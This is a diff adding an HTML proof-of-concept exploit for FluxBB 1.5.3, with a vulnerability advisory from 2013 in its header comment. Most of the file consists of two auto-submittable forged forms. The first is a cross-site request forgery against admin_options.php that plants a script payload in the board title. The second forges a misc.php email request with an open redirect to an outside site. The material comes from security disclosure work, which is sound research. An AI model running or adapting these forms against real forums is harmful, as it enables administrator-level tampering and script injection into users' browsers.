@@ -1,0 +1,125 @@
+<!--
+
+FluxBB 1.5.3 Multiple Remote Vulnerabilities
+
+
+Vendor: FluxBB
+Product web page: http://www.fluxbb.org
+Affected version: 1.5.3
+
+Summary: FluxBB is fast, light, user-friendly forum software for your website.
+
+Desc: FluxBB suffers from a cross-site scripting, cross-site request forgery
+and URL redirect vulnerability. The application allows users to perform certain
+actions via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site. Input passed via the
+'redirect_url' parameter in 'misc.php' script is not properly verified before
+being used to redirect users. This can be exploited to redirect a user to an
+arbitrary website e.g. when a user clicks a specially crafted link to the
+affected script hosted on a trusted domain. It also fails to properly sanitize
+user-supplied input to the 'form[board_title]' POST parameter in the 'admin_options.php'
+script. Attackers can exploit this weakness to execute arbitrary HTML and script
+code in a user's browser session.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.7
+           MySQL 5.5.25a
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2013-5150
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5150.php
+
+
+
+27.07.2013
+
+-->
+
+
+<html>
+<head>
+<title>FluxBB 1.5.3 Multiple Remote Vulnerabilities</title>
+</head>
+<body><center><br />
+<form method="POST" action="http://localhost/fluxbb/admin_options.php">
+<input type="hidden" name="form_sent" value="1" />
+<input type="hidden" name="form[board_title]" value='<script>alert(1)</script>' />
+<input type="hidden" name="form[base_url]" value="http://localhost/fluxbb" />
+<input type="hidden" name="form[default_timezone" value="0" />
+<input type="hidden" name="form[default_dst" value="0" />
+<input type="hidden" name="form[default_lang" value="English" />
+<input type="hidden" name="form[default_style" value="Air" />
+<input type="hidden" name="form[time_format" value="H:i:s" />
+<input type="hidden" name="form[date_format" value="Y-m-d" />
+<input type="hidden" name="form[timeout_visit" value="1800" />
+<input type="hidden" name="form[timeout_online" value="300" />
+<input type="hidden" name="form[redirect_delay" value="1" />
+<input type="hidden" name="form[show_version" value="0" />
+<input type="hidden" name="form[show_user_info" value="1" />
+<input type="hidden" name="form[show_post_count" value="1" />
+<input type="hidden" name="form[smilies]" value="1" />
+<input type="hidden" name="form[smilies_sig" value="1" />
+<input type="hidden" name="form[make_links" value="1" />
+<input type="hidden" name="form[topic_review" value="15" />
+<input type="hidden" name="form[disp_topics_default" value="30" />
+<input type="hidden" name="form[disp_posts_default" value="25" />
+<input type="hidden" name="form[indent_num_spaces" value="4" />
+<input type="hidden" name="form[quote_depth" value="3" />
+<input type="hidden" name="form[quickpost" value="1" />
+<input type="hidden" name="form[users_online" value="1" />
+<input type="hidden" name="form[censoring" value="0" />
+<input type="hidden" name="form[signatures" value="1" />
+<input type="hidden" name="form[show_dot" value="0" />
+<input type="hidden" name="form[topic_views" value="1" />
+<input type="hidden" name="form[quickjump" value="1" />
+<input type="hidden" name="form[gzip" value="0" />
+<input type="hidden" name="form[search_all_forums" value="0" />
+<input type="hidden" name="form[additional_navlinks" value="" />
+<input type="hidden" name="form[feed_type" value="2" />
+<input type="hidden" name="form[feed_ttl" value="0" />
+<input type="hidden" name="form[report_method" value="0" />
+<input type="hidden" name="form[mailing_list" value="lab@zeroscience.mk" />
+<input type="hidden" name="form[avatars" value="1" />
+<input type="hidden" name="form[avatars_dir" value="img/avatars" />
+<input type="hidden" name="form[avatars_width" value="60" />
+<input type="hidden" name="form[avatars_height" value="60" />
+<input type="hidden" name="form[avatars_size" value="10240" />
+<input type="hidden" name="form[admin_email" value="lab@zeroscience.mk" />
+<input type="hidden" name="form[webmaster_email" value="lab@zeroscience.mk" />
+<input type="hidden" name="form[forum_subscriptions" value="1" />
+<input type="hidden" name="form[topic_subscriptions" value="1" />
+<input type="hidden" name="form[smtp_host" value="" />
+<input type="hidden" name="form[smtp_user" value="" />
+<input type="hidden" name="form[smtp_pass1" value="" />
+<input type="hidden" name="form[smtp_pass2" value="" />
+<input type="hidden" name="form[smtp_ssl" value="0" />
+<input type="hidden" name="form[regs_allow" value="1" />
+<input type="hidden" name="form[regs_verify" value="0" />
+<input type="hidden" name="form[regs_report" value="0" />
+<input type="hidden" name="form[rules" value="0" />
+<input type="hidden" name="form[rules_message" value="Enter+your+rules+here" />
+<input type="hidden" name="form[default_email_setting" value="1" />
+<input type="hidden" name="form[announcement" value="0" />
+<input type="hidden" name="form[announcement_message" value="Enter+your+announcement+here." />
+<input type="hidden" name="form[maintenance" value="0" />
+<input type="hidden" name="form[maintenance_message" value="Forum Down!" />
+<input type="hidden" name="save" value="Save+changes" />
+<input type="submit" value="XSS" />
+</form>
+<br />
+<form method="POST" action="http://localhost/fluxbb/misc.php?email=2">
+<input type="hidden" name="form_sent" value="1" />
+<input type="hidden" name="redirect_url" value="http://www.zeroscience.mk" />
+<input type="hidden" name="req_message" value="Follow the Spirit" />
+<input type="hidden" name="req_subject" value="ZSL" />
+<input type="hidden" name="submit" value="Submit" />
+<input type="submit" value="Forge and Redirect" />
+</form>
+</body>
+</html>
